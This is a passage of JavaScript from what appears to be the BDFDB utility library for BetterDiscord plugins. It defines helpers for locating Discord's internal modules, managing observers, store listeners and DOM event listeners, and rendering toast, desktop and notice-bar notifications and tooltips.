			return Internal.findModule("name", JSON.stringify(name), m => m.displayName === name && m || m.render && m.render.displayName === name && m || m[name] && m[name].displayName === name && m[name], typeof useExport != "boolean" ? true : useExport, noWarnings);
		};
		BDFDB.ModuleUtils.findByString = function (...strings) {
			strings = strings.flat(10);
			let arg2 = strings.pop();
			let arg1 = strings.pop();
			let useExport = true, noWarnings = false;
			if (typeof arg2 != "boolean") strings.push(...[arg1, arg2].filter(n => n));
			else {
				if (typeof arg1 != "boolean") {
					if (arg1) strings.push(arg1);
					useExport = arg2;
				}
				else {
					useExport = arg1;
					noWarnings = arg2;
				}
			}
			return Internal.findModule("string", JSON.stringify(strings), m => Internal.hasModuleStrings(m, strings) && m, useExport, noWarnings);
		};
		BDFDB.ModuleUtils.findByPrototypes = function (...protoProps) {
			protoProps = protoProps.flat(10);
			let arg2 = protoProps.pop();
			let arg1 = protoProps.pop();
			let useExport = true, noWarnings = false;
			if (typeof arg2 != "boolean") protoProps.push(...[arg1, arg2].filter(n => n));
			else {
				if (typeof arg1 != "boolean") {
					if (arg1) protoProps.push(arg1);
					useExport = arg2;
				}
				else {
					useExport = arg1;
					noWarnings = arg2;
				}
			}
			return Internal.findModule("proto", JSON.stringify(protoProps), m => m.prototype && protoProps.every(prop => {
				const value = m.prototype[prop];
				return value !== undefined && !(typeof value == "string" && !value);
			}) && m, useExport, noWarnings);
		};
		BDFDB.ModuleUtils.findStringObject = function (props, config = {}) {
			return BDFDB.ModuleUtils.find(m => {
				let amount = Object.keys(m).length;
				return (!config.length || (config.smaller ? amount < config.length : amount == config.length)) && [props].flat(10).every(prop => typeof m[prop] == "string") && m;
			}) || BDFDB.ModuleUtils.find(m => {
				if (typeof m != "function") return false;
				let stringified = m.toString().replace(/\s/g, "");
				if (stringified.indexOf("e=>{e.exports={") != 0) return false;
				let amount = stringified.split(":\"").length - 1;
				return (!config.length || (config.smaller ? amount < config.length : amount == config.length)) && [props].flat(10).every(string => stringified.indexOf(`${string}:`) > -1) && m;
			}, {onlySearchUnloaded: true});
		};
	
		BDFDB.ObserverUtils = {};
		BDFDB.ObserverUtils.connect = function (plugin, eleOrSelec, observer, config = {childList: true}) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !eleOrSelec || !observer) return;
			if (BDFDB.ObjectUtils.isEmpty(plugin.observers)) plugin.observers = {};
			if (!BDFDB.ArrayUtils.is(plugin.observers[observer.name])) plugin.observers[observer.name] = [];
			if (!observer.multi) for (let subinstance of plugin.observers[observer.name]) subinstance.disconnect();
			if (observer.instance) plugin.observers[observer.name].push(observer.instance);
			let instance = plugin.observers[observer.name][plugin.observers[observer.name].length - 1];
			if (instance) {
				let node = Node.prototype.isPrototypeOf(eleOrSelec) ? eleOrSelec : typeof eleOrSelec === "string" ? document.querySelector(eleOrSelec) : null;
				if (node) instance.observe(node, config);
			}
		};
		BDFDB.ObserverUtils.disconnect = function (plugin, observer) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (BDFDB.ObjectUtils.is(plugin) && !BDFDB.ObjectUtils.isEmpty(plugin.observers)) {
				let observername = typeof observer == "string" ? observer : (BDFDB.ObjectUtils.is(observer) ? observer.name : null);
				if (!observername) {
					for (let observer in plugin.observers) for (let instance of plugin.observers[observer]) instance.disconnect();
					delete plugin.observers;
				}
				else if (!BDFDB.ArrayUtils.is(plugin.observers[observername])) {
					for (let instance of plugin.observers[observername]) instance.disconnect();
					delete plugin.observers[observername];
				}
			}
		};

		BDFDB.StoreChangeUtils = {};
		BDFDB.StoreChangeUtils.add = function (plugin, store, callback) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !BDFDB.ObjectUtils.is(store) || typeof store.addChangeListener != "function" ||  typeof callback != "function") return;
			BDFDB.StoreChangeUtils.remove(plugin, store, callback);
			if (!BDFDB.ArrayUtils.is(plugin.changeListeners)) plugin.changeListeners = [];
			plugin.changeListeners.push({store, callback});
			store.addChangeListener(callback);
		};
		BDFDB.StoreChangeUtils.remove = function (plugin, store, callback) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !BDFDB.ArrayUtils.is(plugin.changeListeners)) return;
			if (!store) {
				while (plugin.changeListeners.length) {
					let listener = plugin.changeListeners.pop();
					listener.store.removeChangeListener(listener.callback);
				}
			}
			else if (BDFDB.ObjectUtils.is(store) && typeof store.addChangeListener == "function") {
				if (!callback) {
					for (let listener of plugin.changeListeners) {
						let removedListeners = [];
						if (listener.store == store) {
							listener.store.removeChangeListener(listener.callback);
							removedListeners.push(listener);
						}
						if (removedListeners.length) plugin.changeListeners = plugin.changeListeners.filter(listener => !removedListeners.includes(listener));
					}
				}
				else if (typeof callback == "function") {
					store.removeChangeListener(callback);
					plugin.changeListeners = plugin.changeListeners.filter(listener => listener.store == store && listener.callback == callback);
				}
			}
		};

		var pressedKeys = [], mousePosition;
		BDFDB.ListenerUtils = {};
		BDFDB.ListenerUtils.isPressed = function (key) {
			return pressedKeys.includes(key);
		};
		BDFDB.ListenerUtils.getPosition = function (key) {
			return mousePosition;
		};
		BDFDB.ListenerUtils.add = function (plugin, ele, actions, selectorOrCallback, callbackOrNothing) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || (!Node.prototype.isPrototypeOf(ele) && ele !== window) || !actions) return;
			let callbackIs4th = typeof selectorOrCallback == "function";
			let selector = callbackIs4th ? undefined : selectorOrCallback;
			let callback = callbackIs4th ? selectorOrCallback : callbackOrNothing;
			if (typeof callback != "function") return;
			BDFDB.ListenerUtils.remove(plugin, ele, actions, selector);
			for (let action of actions.split(" ")) {
				action = action.split(".");
				let eventName = action.shift().toLowerCase();
				if (!eventName) return;
				let origEventName = eventName;
				eventName = eventName == "mouseenter" || eventName == "mouseleave" ? "mouseover" : eventName;
				let namespace = (action.join(".") || "") + plugin.name;
				if (!BDFDB.ArrayUtils.is(plugin.eventListeners)) plugin.eventListeners = [];
				let eventCallback = null;
				if (selector) {
					if (origEventName == "mouseenter" || origEventName == "mouseleave") eventCallback = e => {
						for (let child of e.path) if (typeof child.matches == "function" && child.matches(selector) && !child[namespace + "BDFDB" + origEventName]) {
							child[namespace + "BDFDB" + origEventName] = true;
							if (origEventName == "mouseenter") callback(BDFDB.ListenerUtils.copyEvent(e, child));
							let mouseOut = e2 => {
								if (e2.target.contains(child) || e2.target == child || !child.contains(e2.target)) {
									if (origEventName == "mouseleave") callback(BDFDB.ListenerUtils.copyEvent(e, child));
									delete child[namespace + "BDFDB" + origEventName];
									document.removeEventListener("mouseout", mouseOut);
								}
							};
							document.addEventListener("mouseout", mouseOut);
							break;
						}
					};
					else eventCallback = e => {
						for (let child of e.path) if (typeof child.matches == "function" && child.matches(selector)) {
							callback(BDFDB.ListenerUtils.copyEvent(e, child));
							break;
						}
					};
				}
				else eventCallback = e => callback(BDFDB.ListenerUtils.copyEvent(e, ele));
				
				let observer;
				if (Node.prototype.isPrototypeOf(ele)) {
					observer = new MutationObserver(changes => changes.forEach(change => {
						const nodes = Array.from(change.removedNodes);
						if (nodes.indexOf(ele) > -1 || nodes.some(n =>  n.contains(ele))) BDFDB.ListenerUtils.remove(plugin, ele, actions, selector);
					}));
					observer.observe(document.body, {subtree: true, childList: true});
				}

				plugin.eventListeners.push({ele, eventName, origEventName, namespace, selector, eventCallback, observer});
				ele.addEventListener(eventName, eventCallback, true);
			}
		};
		BDFDB.ListenerUtils.remove = function (plugin, ele, actions = "", selector) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !BDFDB.ArrayUtils.is(plugin.eventListeners)) return;
			if (!ele) {
				while (plugin.eventListeners.length) {
					let listener = plugin.eventListeners.pop();
					listener.ele.removeEventListener(listener.eventName, listener.eventCallback, true);
					if (listener.observer) listener.observer.disconnect();
				}
			}
			else if (Node.prototype.isPrototypeOf(ele) || ele === window) {
				for (let action of actions.split(" ")) {
					action = action.split(".");
					let eventName = action.shift().toLowerCase();
					let namespace = (action.join(".") || "") + plugin.name;
					for (let listener of plugin.eventListeners) {
						let removedListeners = [];
						if (listener.ele == ele && (!eventName || listener.origEventName == eventName) && listener.namespace == namespace && (selector === undefined || listener.selector == selector)) {
							listener.ele.removeEventListener(listener.eventName, listener.eventCallback, true);
							if (listener.observer) listener.observer.disconnect();
							removedListeners.push(listener);
						}
						if (removedListeners.length) plugin.eventListeners = plugin.eventListeners.filter(listener => !removedListeners.includes(listener));
					}
				}
			}
		};
		BDFDB.ListenerUtils.addGlobal = function (plugin, id, keybind, action) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (!BDFDB.ObjectUtils.is(plugin) || !id || !BDFDB.ArrayUtils.is(keybind) || typeof action != "function") return;
			if (!BDFDB.ObjectUtils.is(plugin.globalKeybinds)) plugin.globalKeybinds = {};
			BDFDB.ListenerUtils.removeGlobal(plugin, id);
			plugin.globalKeybinds[id] = BDFDB.NumberUtils.generateId(Object.entries(plugin.globalKeybinds).map(n => n[1]));
			BDFDB.LibraryModules.WindowUtils.inputEventRegister(plugin.globalKeybinds[id], keybind.map(n => [0, n]), action, {blurred: true, focused: true, keydown: false, keyup: true});
			return (_ => BDFDB.ListenerUtils.removeGlobal(plugin, id));
		};
		BDFDB.ListenerUtils.removeGlobal = function (plugin, id) {
			if (!BDFDB.ObjectUtils.is(plugin) || !plugin.globalKeybinds) return;
			if (!id) {
				for (let cachedId in plugin.globalKeybinds) BDFDB.LibraryModules.WindowUtils.inputEventUnregister(plugin.globalKeybinds[cachedId]);
				plugin.globalKeybinds = {};
			}
			else {
				BDFDB.LibraryModules.WindowUtils.inputEventUnregister(plugin.globalKeybinds[id]);
				delete plugin.globalKeybinds[id];
			}
		};
		BDFDB.ListenerUtils.multiAdd = function (node, actions, callback) {
			if (!Node.prototype.isPrototypeOf(node) || !actions || typeof callback != "function") return;
			for (let action of actions.trim().split(" ").filter(n => n)) node.addEventListener(action, callback, true);
		};
		BDFDB.ListenerUtils.multiRemove = function (node, actions, callback) {
			if (!Node.prototype.isPrototypeOf(node) || !actions || typeof callback != "function") return;
			for (let action of actions.trim().split(" ").filter(n => n)) node.removeEventListener(action, callback, true);
		};
		BDFDB.ListenerUtils.addToChildren = function (node, actions, selector, callback) {
			if (!Node.prototype.isPrototypeOf(node) || !actions || !selector || !selector.trim() || typeof callback != "function") return;
			for (let action of actions.trim().split(" ").filter(n => n)) {
				let eventCallback = callback;
				if (action == "mouseenter" || action == "mouseleave") eventCallback = e => {if (e.target.matches(selector)) callback(e);};
				node.querySelectorAll(selector.trim()).forEach(child => {child.addEventListener(action, eventCallback, true);});
			}
		};
		BDFDB.ListenerUtils.copyEvent = function (e, ele) {
			if (!e || !e.constructor || !e.type) return e;
			let eCopy = new e.constructor(e.type, e);
			Object.defineProperty(eCopy, "originalEvent", {value: e});
			Object.defineProperty(eCopy, "which", {value: e.which});
			Object.defineProperty(eCopy, "keyCode", {value: e.keyCode});
			Object.defineProperty(eCopy, "path", {value: e.path});
			Object.defineProperty(eCopy, "relatedTarget", {value: e.relatedTarget});
			Object.defineProperty(eCopy, "srcElement", {value: e.srcElement});
			Object.defineProperty(eCopy, "target", {value: e.target});
			Object.defineProperty(eCopy, "toElement", {value: e.toElement});
			if (ele) Object.defineProperty(eCopy, "currentTarget", {value: ele});
			return eCopy;
		};
		BDFDB.ListenerUtils.stopEvent = function (e) {
			if (BDFDB.ObjectUtils.is(e)) {
				if (typeof e.preventDefault == "function") e.preventDefault();
				if (typeof e.stopPropagation == "function") e.stopPropagation();
				if (typeof e.stopImmediatePropagation == "function") e.stopImmediatePropagation();
				if (BDFDB.ObjectUtils.is(e.originalEvent)) {
					if (typeof e.originalEvent.preventDefault == "function") e.originalEvent.preventDefault();
					if (typeof e.originalEvent.stopPropagation == "function") e.originalEvent.stopPropagation();
					if (typeof e.originalEvent.stopImmediatePropagation == "function") e.originalEvent.stopImmediatePropagation();
				}
			}
		};
		
		var Toasts = [], NotificationBars = [];
		var ToastQueues = {}, DesktopNotificationQueue = {queue: [], running: false};
		for (let key in LibraryConstants.ToastPositions) ToastQueues[LibraryConstants.ToastPositions[key]] = {queue: [], full: false};
		
		BDFDB.NotificationUtils = {};
		BDFDB.NotificationUtils.toast = function (children, config = {}) {
			if (!children) return;
			let app = document.querySelector(BDFDB.dotCN.appmount) || document.body;
			if (!app) return;
			let position = config.position && LibraryConstants.ToastPositions[config.position] || Internal.settings.choices.toastPosition && LibraryConstants.ToastPositions[Internal.settings.choices.toastPosition] || LibraryConstants.ToastPositions.right;
			
			const runQueue = _ => {
				if (ToastQueues[position].full) return;
				let data = ToastQueues[position].queue.shift();
				if (!data) return;
				
				let id = BDFDB.NumberUtils.generateId(Toasts);
				let toasts = document.querySelector(BDFDB.dotCN.toasts + BDFDB.dotCN[position]);
				if (!toasts) {
					toasts = BDFDB.DOMUtils.create(`<div class="${BDFDB.DOMUtils.formatClassName(BDFDB.disCN.toasts, BDFDB.disCN[position])}"></div>`);
					app.appendChild(toasts);
				}
				
				if (data.config.id) data.toast.id = data.config.id.split(" ").join("");
				if (data.config.className) BDFDB.DOMUtils.addClass(data.toast, data.config.className);
				if (data.config.css) BDFDB.DOMUtils.appendLocalStyle("BDFDBcustomToast" + id, data.config.css);
				if (data.config.style) data.toast.style = Object.assign({}, data.toast.style, data.config.style);
				
				let backgroundColor, fontColor, barColor;
				
				let type = data.config.type && BDFDB.disCN["toast" + data.config.type];
				if (!type) {
					barColor = BDFDB.ColorUtils.getType(data.config.barColor) ? BDFDB.ColorUtils.convert(data.config.barColor, "HEX") : data.config.barColor;
					let comp = BDFDB.ColorUtils.convert(data.config.color, "RGBCOMP");
					if (comp) {
						backgroundColor = BDFDB.ColorUtils.convert(comp, "HEX");
						fontColor = comp[0] > 180 && comp[1] > 180 && comp[2] > 180 ? "#000" : "#FFF";
						BDFDB.DOMUtils.addClass(data.toast, BDFDB.disCN.toastcustom);
					}
					else BDFDB.DOMUtils.addClass(data.toast, BDFDB.disCN.toastdefault);
				}
				else BDFDB.DOMUtils.addClass(data.toast, type);
				
				let loadingInterval;
				let disableInteractions = data.config.disableInteractions && typeof data.config.onClick != "function";
				let timeout = typeof data.config.timeout == "number" && !disableInteractions ? data.config.timeout : 3000;
				timeout = (timeout > 0 ? timeout : 600000) + 300;
				if (data.config.ellipsis && typeof data.children == "string") loadingInterval = BDFDB.TimeUtils.interval(_ => data.toast.update(data.children.endsWith(".....") ? data.children.slice(0, -5) : data.children + "."), 500);
				
				let closeTimeout = BDFDB.TimeUtils.timeout(_ => data.toast.close(), timeout);
				data.toast.close = _ => {
					BDFDB.TimeUtils.clear(closeTimeout);
					if (document.contains(data.toast)) {
						BDFDB.DOMUtils.addClass(data.toast, BDFDB.disCN.toastclosing);
						data.toast.style.setProperty("pointer-events", "none", "important");
						BDFDB.TimeUtils.timeout(_ => {
							if (typeof data.config.onClose == "function") data.config.onClose();
							BDFDB.TimeUtils.clear(loadingInterval);
							BDFDB.ArrayUtils.remove(Toasts, id);
							BDFDB.DOMUtils.removeLocalStyle("BDFDBcustomToast" + id);
							data.toast.remove();
							if (!toasts.querySelectorAll(BDFDB.dotCN.toast).length) toasts.remove();
						}, 300);
					}
					ToastQueues[position].full = false;
					runQueue();
				};
				
				if (disableInteractions) data.toast.style.setProperty("pointer-events", "none", "important");
				else {
					BDFDB.DOMUtils.addClass(data.toast, BDFDB.disCN.toastclosable);
					data.toast.addEventListener("click", event => {
						if (typeof data.config.onClick == "function" && !BDFDB.DOMUtils.getParent(BDFDB.dotCN.toastcloseicon, event.target)) data.config.onClick();
						data.toast.close();
					});
					if (typeof closeTimeout.pause == "function") {
						let paused = false;
						data.toast.addEventListener("mouseenter", _ => {
							if (paused) return;
							paused = true;
							closeTimeout.pause();
						});
						data.toast.addEventListener("mouseleave", _ => {
							if (!paused) return;
							paused = false;
							closeTimeout.resume();
						});
					}
				}
				
				toasts.appendChild(data.toast);
				BDFDB.TimeUtils.timeout(_ => BDFDB.DOMUtils.removeClass(data.toast, BDFDB.disCN.toastopening));
				
				let icon = data.config.avatar ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.AvatarComponents.default, {
					src: data.config.avatar,
					size: Internal.LibraryComponents.AvatarComponents.Sizes.SIZE_24
				}) : ((data.config.icon || data.config.type && LibraryConstants.ToastIcons[data.config.type]) ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
					name: data.config.type && LibraryConstants.ToastIcons[data.config.type] && Internal.LibraryComponents.SvgIcon.Names[LibraryConstants.ToastIcons[data.config.type]],
					iconSVG: data.config.icon,
					width: 18,
					height: 18,
					nativeClass: true
				}) : null);
				
				BDFDB.ReactUtils.render(BDFDB.ReactUtils.createElement(class BDFDB_Toast extends Internal.LibraryModules.React.Component {
					componentDidMount() {
						data.toast.update = newChildren => {
							if (!newChildren) return;
							data.children = newChildren;
							BDFDB.ReactUtils.forceUpdate(this);
						};
					}
					render() {
						return BDFDB.ReactUtils.createElement(Internal.LibraryModules.React.Fragment, {
							children: [
								BDFDB.ReactUtils.createElement("div", {
									className: BDFDB.disCN.toastbg,
									style: {backgroundColor: backgroundColor}
								}),
								BDFDB.ReactUtils.createElement("div", {
									className: BDFDB.disCN.toastinner,
									style: {color: fontColor},
									children: [
										icon && BDFDB.ReactUtils.createElement("div", {
											className: BDFDB.DOMUtils.formatClassName(data.config.avatar && BDFDB.disCN.toastavatar, BDFDB.disCN.toasticon, data.config.iconClassName),
											children: icon
										}),
										BDFDB.ReactUtils.createElement("div", {
											className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.toasttext, data.config.textClassName),
											children: data.children
										}),
										!disableInteractions && BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
											className: BDFDB.disCN.toastcloseicon,
											name: Internal.LibraryComponents.SvgIcon.Names.CLOSE,
											width: 16,
											height: 16
										})
									].filter(n => n)
								}),
								BDFDB.ReactUtils.createElement("div", {
									className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.toastbar, barColor && BDFDB.disCN.toastcustombar),
									style: {
										backgroundColor: barColor,
										animation: `toast-bar ${timeout}ms normal linear`
									}
								})
							]
						});
					}
				}, {}), data.toast);
				
				ToastQueues[position].full = (BDFDB.ArrayUtils.sum(Array.from(toasts.childNodes).map(c => {
					let height = BDFDB.DOMUtils.getRects(c).height;
					return height > 50 ? height : 50;
				})) - 100) > BDFDB.DOMUtils.getRects(app).height;
				
				if (typeof data.config.onShow == "function") data.config.onShow();
			};
			
			let toast = BDFDB.DOMUtils.create(`<div class="${BDFDB.disCNS.toast + BDFDB.disCN.toastopening}"></div>`);
			toast.update = _ => {};
			ToastQueues[position].queue.push({children, config, toast});
			runQueue();
			return toast;
		};
		BDFDB.NotificationUtils.desktop = function (content, config = {}) {
			if (!content) return;
			
			const queue = _ => {
				DesktopNotificationQueue.queue.push({content, config});
				runQueue();
			};
			const runQueue = _ => {
				if (DesktopNotificationQueue.running) return;
				let data = DesktopNotificationQueue.queue.shift();
				if (!data) return;
				
				DesktopNotificationQueue.running = true;
				let muted = data.config.silent;
				data.config.silent = data.config.silent || data.config.sound ? true : false;
				let audio = new Audio();
				if (!muted && data.config.sound) {
					audio.src = data.config.sound;
					audio.play();
				}
				let notification = new Notification(data.content, data.config);
				
				let disableInteractions = data.config.disableInteractions && typeof data.config.onClick != "function";
				if (disableInteractions) notification.onclick = _ => {};
				else notification.onclick = _ => {
					if (typeof data.config.onClick == "function") data.config.onClick();
					notification.close();
				};
				
				notification.onclose = _ => {
					audio.pause();
					DesktopNotificationQueue.running = false;
					BDFDB.TimeUtils.timeout(runQueue, 1000);
				}
			};
			
			if (!("Notification" in window)) {}
			else if (Notification.permission === "granted") queue();
			else if (Notification.permission !== "denied") Notification.requestPermission(function (response) {if (response === "granted") queue();});
		};
		BDFDB.NotificationUtils.notice = function (text, config = {}) {
			if (!text) return;
			let layers = document.querySelector(BDFDB.dotCN.layers) || document.querySelector(BDFDB.dotCN.appmount);
			if (!layers) return;
			let id = BDFDB.NumberUtils.generateId(NotificationBars);
			let notice = BDFDB.DOMUtils.create(`<div class="${BDFDB.disCNS.notice + BDFDB.disCN.noticewrapper}" notice-id="${id}"><div class="${BDFDB.disCN.noticedismiss}"${config.forceStyle ? ` style="width: 36px !important; height: 36px !important; position: absolute !important; top: 0 !important; right: 0 !important; left: unset !important;"` : ""}></div><div class="${BDFDB.disCN.noticetext}"></div></div>`);
			layers.parentElement.insertBefore(notice, layers);
			let noticeText = notice.querySelector(BDFDB.dotCN.noticetext);
			if (config.platform) for (let platform of config.platform.split(" ")) if (DiscordClasses["noticeicon" + platform]) {
				let icon = BDFDB.DOMUtils.create(`<i class="${BDFDB.disCN["noticeicon" + platform]}"></i>`);
				BDFDB.DOMUtils.addClass(icon, BDFDB.disCN.noticeplatformicon);
				BDFDB.DOMUtils.removeClass(icon, BDFDB.disCN.noticeicon);
				notice.insertBefore(icon, noticeText);
			}
			if (config.customIcon) {
				let icon = document.createElement("i"), iconInner = BDFDB.DOMUtils.create(config.customIcon);
				if (iconInner.nodeType == Node.TEXT_NODE) icon.style.setProperty("background", `url(${config.customIcon}) center/cover no-repeat`);
				else {
					icon = iconInner;
					if ((icon.tagName || "").toUpperCase() == "SVG") {
						icon.removeAttribute("width");
						icon.setAttribute("height", "100%");
					}
				}
				BDFDB.DOMUtils.addClass(icon, BDFDB.disCN.noticeplatformicon);
				BDFDB.DOMUtils.removeClass(icon, BDFDB.disCN.noticeicon);
				notice.insertBefore(icon, noticeText);
			}
			if (BDFDB.ArrayUtils.is(config.buttons)) for (let data of config.buttons) {
				let contents = typeof data.contents == "string" && data.contents;
				if (contents) {
					let button = BDFDB.DOMUtils.create(`<button class="${BDFDB.DOMUtils.formatClassName(BDFDB.disCN.noticebutton, data.className)}">${contents}</button>`);
					button.addEventListener("click", event => {
						if (data.close) notice.close();
						if (typeof data.onClick == "function") data.onClick(event, notice);
					});
					if (typeof data.onMouseEnter == "function") button.addEventListener("mouseenter", event => data.onMouseEnter(event, notice));
					if (typeof data.onMouseLeave == "function") button.addEventListener("mouseleave", event => data.onMouseLeave(event, notice));
					notice.appendChild(button);
				}
			}
			if (config.id) notice.id = config.id.split(" ").join("");
			if (config.className) BDFDB.DOMUtils.addClass(notice, config.className);
			if (config.textClassName) BDFDB.DOMUtils.addClass(noticeText, config.textClassName);
			if (config.css) BDFDB.DOMUtils.appendLocalStyle("BDFDBcustomNotificationBar" + id, config.css);
			if (config.style) notice.style = config.style;
			if (config.html) noticeText.innerHTML = text;
			else {
				let link = document.createElement("a");
				let newText = [];
				for (let word of text.split(" ")) {
					let encodedWord = BDFDB.StringUtils.htmlEscape(word);
					link.href = word;
					newText.push(link.host && link.host !== window.location.host ? `<label class="${BDFDB.disCN.noticetextlink}">${encodedWord}</label>` : encodedWord);
				}
				noticeText.innerHTML = newText.join(" ");
			}
			let type = null;
			if (config.type && !document.querySelector(BDFDB.dotCNS.chatbase + BDFDB.dotCN.noticestreamer)) {
				if (type = BDFDB.disCN["notice" + config.type]) BDFDB.DOMUtils.addClass(notice, type);
				if (config.type == "premium") {
					let noticeButton = notice.querySelector(BDFDB.dotCN.noticebutton);
					if (noticeButton) BDFDB.DOMUtils.addClass(noticeButton, BDFDB.disCN.noticepremiumaction);
					BDFDB.DOMUtils.addClass(noticeText, BDFDB.disCN.noticepremiumtext);
					notice.insertBefore(BDFDB.DOMUtils.create(`<i class="${BDFDB.disCN.noticepremiumlogo}"></i>`), noticeText);
				}
			}
			if (!type) {
				let comp = BDFDB.ColorUtils.convert(config.color, "RGBCOMP");
				if (comp) {
					let fontColor = comp[0] > 180 && comp[1] > 180 && comp[2] > 180 ? "#000" : "#FFF";
					let backgroundColor = BDFDB.ColorUtils.convert(comp, "HEX");
					let filter = comp[0] > 180 && comp[1] > 180 && comp[2] > 180 ? "brightness(0%)" : "brightness(100%)";
					BDFDB.DOMUtils.appendLocalStyle("BDFDBcustomNotificationBarColorCorrection" + id, `${BDFDB.dotCN.noticewrapper}[notice-id="${id}"]{background-color: ${backgroundColor} !important;}${BDFDB.dotCN.noticewrapper}[notice-id="${id}"] ${BDFDB.dotCN.noticetext} {color: ${fontColor} !important;}${BDFDB.dotCN.noticewrapper}[notice-id="${id}"] ${BDFDB.dotCN.noticebutton} {color: ${fontColor} !important;border-color: ${BDFDB.ColorUtils.setAlpha(fontColor, 0.25, "RGBA")} !important;}${BDFDB.dotCN.noticewrapper}[notice-id="${id}"] ${BDFDB.dotCN.noticebutton}:hover {color: ${backgroundColor} !important;background-color: ${fontColor} !important;}${BDFDB.dotCN.noticewrapper}[notice-id="${id}"] ${BDFDB.dotCN.noticedismiss} {filter: ${filter} !important;}`);
					BDFDB.DOMUtils.addClass(notice, BDFDB.disCN.noticecustom);
				}
				else BDFDB.DOMUtils.addClass(notice, BDFDB.disCN.noticedefault);
			}
			if (config.forceStyle) {
				notice.style.setProperty("display", "flex", "important");
				notice.style.setProperty("height", "36px", "important");
				notice.style.setProperty("min-width", "70vw", "important");
				notice.style.setProperty("left", "unset", "important");
				notice.style.setProperty("right", "unset", "important");
				let sideMargin = ((BDFDB.DOMUtils.getWidth(document.body.firstElementChild) - BDFDB.DOMUtils.getWidth(notice))/2);
				notice.style.setProperty("left", `${sideMargin}px`, "important");
				notice.style.setProperty("right", `${sideMargin}px`, "important");
				notice.style.setProperty("min-width", "unset", "important");
				notice.style.setProperty("width", "unset", "important");
				notice.style.setProperty("max-width", `calc(100vw - ${sideMargin*2}px)`, "important");
			}
			notice.close = _ => {
				BDFDB.DOMUtils.addClass(notice, BDFDB.disCN.noticeclosing);
				if (config.forceStyle) {
					notice.style.setProperty("overflow", "hidden", "important");
					notice.style.setProperty("height", "0px", "important");
				}
				if (notice.tooltip && typeof notice.tooltip.removeTooltip == "function") notice.tooltip.removeTooltip();
				BDFDB.TimeUtils.timeout(_ => {
					if (typeof config.onClose == "function") config.onClose();
					BDFDB.ArrayUtils.remove(NotificationBars, id);
					BDFDB.DOMUtils.removeLocalStyle("BDFDBcustomNotificationBar" + id);
					BDFDB.DOMUtils.removeLocalStyle("BDFDBcustomNotificationBarColorCorrection" + id);
					BDFDB.DOMUtils.remove(notice);
				}, 500);
			};
			notice.querySelector(BDFDB.dotCN.noticedismiss).addEventListener("click", notice.close);
			return notice;
		};
		BDFDB.NotificationUtils.alert = function (header, body) {
			if (typeof header == "string" && typeof header == "string" && BdApi && typeof BdApi.alert == "function") BdApi.alert(header, body);
		};

		var Tooltips = [];
		BDFDB.TooltipUtils = {};
		BDFDB.TooltipUtils.create = function (anker, text, config = {}) {
			if (!text && !config.guild) return null;
			const itemLayerContainer = document.querySelector(BDFDB.dotCN.appmount +  " > " + BDFDB.dotCN.itemlayercontainer);
			if (!itemLayerContainer || !Node.prototype.isPrototypeOf(anker) || !document.contains(anker)) return null;
			const id = BDFDB.NumberUtils.generateId(Tooltips);
			const itemLayer = BDFDB.DOMUtils.create(`<div class="${BDFDB.disCNS.itemlayer + BDFDB.disCN.itemlayerdisabledpointerevents}"><div class="${BDFDB.disCN.tooltip}" tooltip-id="${id}"><div class="${BDFDB.disCN.tooltipcontent}"></div><div class="${BDFDB.disCN.tooltippointer}"></div></div></div>`);
			itemLayerContainer.appendChild(itemLayer);
			
			const tooltip = itemLayer.firstElementChild;
			const tooltipContent = itemLayer.querySelector(BDFDB.dotCN.tooltipcontent);
			const tooltipPointer = itemLayer.querySelector(BDFDB.dotCN.tooltippointer);
			
			if (config.id) tooltip.id = config.id.split(" ").join("");
			
			if (typeof config.type != "string" || !BDFDB.disCN["tooltip" + config.type.toLowerCase()]) config.type = "top";
			let type = config.type.toLowerCase();
			BDFDB.DOMUtils.addClass(tooltip, BDFDB.disCN["tooltip" + type], config.className);
			
			let fontColorIsGradient = false, customBackgroundColor = false, style = "";
			if (config.style) style += config.style;
			if (config.fontColor) {
				fontColorIsGradient = BDFDB.ObjectUtils.is(config.fontColor);
				if (!fontColorIsGradient) style = (style ? (style + " ") : "") + `color: ${BDFDB.ColorUtils.convert(config.fontColor, "RGBA")} !important;`
			}
			if (config.backgroundColor) {
				customBackgroundColor = true;
				let backgroundColorIsGradient = BDFDB.ObjectUtils.is(config.backgroundColor);
				let backgroundColor = !backgroundColorIsGradient ? BDFDB.ColorUtils.convert(config.backgroundColor, "RGBA") : BDFDB.ColorUtils.createGradient(config.backgroundColor);
				style = (style ? (style + " ") : "") + `background: ${backgroundColor} !important; border-color: ${backgroundColorIsGradient ? BDFDB.ColorUtils.convert(config.backgroundColor[type == "left" ? 100 : 0], "RGBA") : backgroundColor} !important;`;
			}
			if (style) tooltip.style = style;
			const zIndexed = config.zIndex && typeof config.zIndex == "number";
			if (zIndexed) {
				itemLayer.style.setProperty("z-index", config.zIndex, "important");
				tooltip.style.setProperty("z-index", config.zIndex, "important");
				tooltipContent.style.setProperty("z-index", config.zIndex, "important");
				BDFDB.DOMUtils.addClass(itemLayerContainer, BDFDB.disCN.itemlayercontainerzindexdisabled);
			}
			if (typeof config.width == "number" && config.width > 196) {
				tooltip.style.setProperty("width", `${config.width}px`, "important");
				tooltip.style.setProperty("max-width", `${config.width}px`, "important");
			}
			if (typeof config.maxWidth == "number" && config.maxWidth > 196) {
				tooltip.style.setProperty("max-width", `${config.maxWidth}px`, "important");
			}
			if (customBackgroundColor) BDFDB.DOMUtils.addClass(tooltip, BDFDB.disCN.tooltipcustom);
			else if (config.color && BDFDB.disCN["tooltip" + config.color.toLowerCase()]) BDFDB.DOMUtils.addClass(tooltip, BDFDB.disCN["tooltip" + config.color.toLowerCase()]);
